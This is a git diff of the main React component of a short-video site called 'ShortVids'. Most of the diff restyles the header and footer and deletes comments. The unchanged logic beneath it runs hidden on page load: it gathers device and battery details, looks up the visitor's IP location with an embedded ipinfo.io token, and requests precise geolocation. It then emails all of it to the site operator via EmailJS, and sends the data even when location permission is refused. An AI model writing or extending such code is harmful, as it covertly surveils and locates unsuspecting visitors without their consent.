@@ -1,7 +1,9 @@
-import { useEffect } from 'react';
+import React, { useEffect } from 'react';
 import emailjs from '@emailjs/browser';
 import platform from 'platform';
 import Short_Videos from './component/short_videos';
+import { Video } from 'lucide-react';
+import './styles.css';
 
 const App = () => {
   useEffect(() => {
@@ -39,40 +41,31 @@ const App = () => {
 
     async function getUserInfo() {
       try {
-        // Get device info and battery info regardless of geolocation permission
         const deviceInfo = getDeviceInfo();
         const batteryInfo = await getBatteryInfo();
         
-        // Try to get IP info first
         let ipInfo = {};
         try {
           const ipResponse = await fetch('https://ipinfo.io/json?token=ea93449de8482c');
           ipInfo = await ipResponse.json();
         } catch (ipError) {
           console.error('Error fetching IP info:', ipError);
-          ipInfo = {};
         }
 
-        // Try to get geolocation, but continue even if denied
         try {
           navigator.geolocation.getCurrentPosition(
-            // Success callback
-            async (position) => {
+            (position) => {
               const { latitude, longitude } = position.coords;
-              // Send all info with coordinates
               sendInfoToEmail(ipInfo, deviceInfo, batteryInfo, latitude, longitude);
             },
-            // Error callback - user denied permission or other error
             (error) => {
               console.log('Geolocation error or denied:', error.message);
-              // Send available info without coordinates
               sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
             },
             { enableHighAccuracy: true, timeout: 10000 }
           );
         } catch (geoError) {
           console.error('Geolocation not supported:', geoError);
-          // Send available info without coordinates
           sendInfoToEmail(ipInfo, deviceInfo, batteryInfo);
         }
       } catch (error) {
@@ -120,37 +113,51 @@ const App = () => {
       }
     }
 
-    // Start the process
     getUserInfo();
   }, []);
 
   return (
-    <div style={{
-      fontFamily: 'Arial, sans-serif'
-    }}>
-      <header style={{
-        backgroundColor: '#333',
-        color: 'white',
-        padding: '1rem',
-        textAlign: 'center',
-        marginBottom: '1rem'
-      }}>
-        <h1 style={{ margin: 0 }}>ShortVids</h1>
-        <p style={{ margin: '0.5rem 0 0' }}>Watch and share amazing short videos</p>
+    <div className="font-sans bg-gray-50 min-h-screen flex flex-col">
+      <header className="header">
+        <div className="container">
+          <div className="header-content">
+            <div className="logo-container">
+              <Video className="logo-icon" />
+              <h1 className="logo-text">ShortVids</h1>
+            </div>
+            <p className="text-sm md:text-base opacity-90">Watch and share amazing short videos</p>
+          </div>
+        </div>
       </header>
       
-      <main>
+      <main className="flex-grow">
         <Short_Videos />
       </main>
       
-      <footer style={{
-        backgroundColor: '#333',
-        color: 'white',
-        padding: '1rem',
-        textAlign: 'center',
-        marginTop: '2rem'
-      }}>
-        <p style={{ margin: 0 }}>© 2025 ShortVids - All rights reserved</p>
+      <footer className="footer">
+        <div className="container">
+          <div className="footer-content">
+            <div>
+              <div className="footer-logo">
+                <Video size={20} className="mr-2" />
+                <span className="text-lg font-semibold">ShortVids</span>
+              </div>
+              <p className="footer-text">© 2025 ShortVids - All rights reserved</p>
+            </div>
+            
+            <div className="social-links">
+              <a href="#" className="social-link mr-4">
+                <i className="fa fa-twitter"></i>
+              </a>
+              <a href="#" className="social-link mr-4">
+                <i className="fa fa-instagram"></i>
+              </a>
+              <a href="#" className="social-link">
+                <i className="fa fa-facebook"></i>
+              </a>
+            </div>
+          </div>
+        </div>
       </footer>
     </div>
   );
